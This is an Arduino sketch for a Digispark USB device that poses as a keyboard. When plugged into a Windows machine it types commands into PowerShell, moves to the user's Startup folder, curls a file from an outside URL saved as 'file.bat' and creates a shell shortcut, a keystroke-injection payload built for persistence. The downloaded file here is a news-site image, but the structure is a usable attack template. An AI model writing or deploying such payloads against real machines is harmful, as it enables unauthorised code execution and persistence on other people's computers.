#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("$getUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.split('\\')[1]"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("Set-Location \"C:\\Users\\$getUserName\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("curl -O file.bat \"https://www.al-monitor.com/sites/default/files/styles/article_header/public/almpics/2019/03/RTS2DKRR.jpg/RTS2DKRR.jpg?h=a5ae579a&itok=VbjmDPDs\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$WshShell = New-Object -comObject WScript.shell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$Shortcut = $WshShell.CreateShortcut(\"file.bat\")"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$Shortcut.save()"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}